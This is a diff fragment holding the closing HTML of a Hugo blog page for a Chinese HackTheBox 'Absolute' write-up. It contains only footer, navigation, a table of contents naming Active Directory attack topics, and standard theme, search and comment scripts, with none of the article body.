+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/windows"
+        rel="tag"
+        >WINDOWS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/adcs"
+        rel="tag"
+        >ADCS</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_152.webp"
+              data-sizes="auto"
+              alt="HTB Authority"
+              class="lazyload"
+            /><a
+          href="/post/htb-authority/"
+          aria-label="前一篇:HTB Authority"
+          title="前一篇:HTB Authority"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">HTB Authority</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;83.5k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:09</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#smb服务">SMB服务</a></li>
+    <li><a href="#http服务">HTTP服务</a></li>
+    <li><a href="#as-rep-roasting攻击">AS-REP Roasting攻击</a></li>
+    <li><a href="#再探smb">再探SMB</a></li>
+    <li><a href="#tgt黄金票据伪造">TGT黄金票据伪造</a></li>
+    <li><a href="#看不懂的exe">看不懂的exe</a></li>
+    <li><a href="#bloodhound信息收集">bloodhound信息收集</a></li>
+    <li><a href="#拿下winrm_user">拿下winrm_user？</a></li>
+    <li><a href="#待更新">待更新</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">40</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </a>
+</div>
+<div class="sidebar-social"></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "HTB Absolute",
+          url: "http:\/\/localhost:1313\/post\/htb-absolute\/",
+          description: "HackTheBox篇ADCS系列之Absolute",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
